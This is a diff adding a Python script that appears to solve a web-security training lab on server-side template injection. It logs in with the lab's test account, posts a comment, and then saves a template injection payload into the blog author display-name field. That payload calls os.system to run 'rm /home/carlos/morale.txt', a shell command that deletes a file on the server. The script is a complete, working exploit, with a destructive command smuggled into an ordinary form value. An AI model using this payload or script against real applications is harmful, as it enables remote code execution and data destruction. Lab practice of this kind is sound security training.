@@ -1,0 +1,61 @@
+import re
+import requests
+
+session = requests.session()
+base_url = input("Enter the lab URL: ").strip().rstrip("/")
+
+def get_csrf(html):
+    match = re.search(r'name="csrf" value="([^"]+)"', html)
+    return match.group(1) if match else None
+
+login_page = session.get(f"{base_url}/login")
+payload = {
+     'csrf': get_csrf(login_page.text),
+        'username': 'wiener',
+        'password': 'peter'
+}
+login = session.post(f"{base_url}/login", data=payload, timeout=10)
+
+account = session.get(f"{base_url}/my-account", timeout=10)
+if "wiener" not in account.text:
+    print("[*] Login failed. Check the credentials.")
+    exit(1)
+print("[*] Logged in as wiener.")
+
+home = session.get(base_url, timeout=10)
+post_match = re.search(r'postId=(\d+)', home.text)
+if not post_match:
+    print("[*] Could not find a blog post on the home page.")
+    exit(1)
+post_id = post_match.group(1)
+
+post_page = session.get(f"{base_url}/post?postId={post_id}", timeout=10)
+paylaod_loginto = {
+    'csrf': get_csrf(post_page.text),
+        'postId': post_id,
+        'comment': "test comment",
+        'name': "wiener",
+        'email': "wiener@test.com",
+        'website': ""
+}
+session.post(f"{base_url}/post/comment", data= paylaod_loginto, timeout=10)
+print(f"[*] Posted a test comment on post {post_id}.")
+
+
+payload = {
+    'blog-post-author-display': "user.name}}{% import os %}{{os.system('rm /home/carlos/morale.txt')",
+    'csrf': get_csrf(account.text) or ""
+}
+response = session.post(f"{base_url}/my-account/change-blog-post-author-display",
+                        data=payload, timeout=10)
+if response.status_code not in (200, 302):
+    print(f"[*] Setting display name failed. HTTP Status: {response.status_code}")
+    exit(1)
+print("[*] Payload saved as the display name.")
+
+
+result = session.get(f"{base_url}/post?postId={post_id}", timeout=10)
+if result.status_code == 200:
+    print("[*] Reloaded the post.solved.")
+else:
+    print(f"[*] Reload failed. HTTP Status: {result.status_code}")
